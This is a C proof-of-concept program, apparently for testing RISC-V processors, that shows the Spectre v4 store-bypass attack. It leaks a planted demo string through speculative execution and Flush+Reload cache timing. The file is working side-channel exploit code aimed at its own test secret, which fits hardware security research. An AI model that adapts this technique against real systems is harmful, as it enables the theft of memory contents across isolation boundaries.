/*-------------------------------------------------------------------------------
// This code is modified from Shawn Liu's version.
// E-mail:  shawn110285@gmail.com
// Description: the control module
// POC on the spectre attack via store bypass
--------------------------------------------------------------------------------*/

// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//-----------------------------------------------------------------

#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

char* secretString = "!\"#ThisIsTheBabyBoomerTest";


/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}


uint64_t   str_index = 1;
uint64_t   temp = 0;
uint8_t    dummy = 2;
uint64_t   str[256];
uint64_t   div = 2;
void victim_function(uint64_t idx)
{
    str[1] = idx;
    // stall str_index by doing div operations (operation is (str_index << 4) / (2**4))
    // empirical and after test, 1 division operations is much better than more
    str_index =  str_index << 8;             //str_index = 2
    asm("fcvt.s.lu	fa4, %[in]\n"            //fa4=2.0
        "fcvt.s.lu	fa5, %[inout]\n"         //fa5=2.0
        "fdiv.s	fa5, fa5, fa4\n"             //fa5=1.0
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"             //fa5=1.0
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"     //single precise floating point to long unsign int, str_index = 1
        : [out] "=r" (str_index)
        : [inout] "r" (str_index), [in] "r" (div)
        : "fa4", "fa5");
    str[str_index] = 0;
    temp &= array2[array1[str[1]] * L1_BLOCK_SZ_BYTES];
    // bound speculation here just in case it goes over
    dummy = rdcycle();
}


int main(void)
{
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff;
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v4 (Store Bypass) ========================= \n");
    printf("the secret key is:%s \n", secretString);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len)
	{

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
		{
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
		{

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
            victim_function(attackIdx);

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i)
            {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);

                if ( diff < CACHE_HIT_THRESHOLD )
				{
					// printf("len=%ld, atkRound=%ld, add 1 to results[%ld], diff=%lu \n", len, atkRound, i, diff);
                    results[i] += 1;
                }
            }
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]); 
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]);  

        // read in the next secret
        ++attackIdx;
    }

    return 0;
}
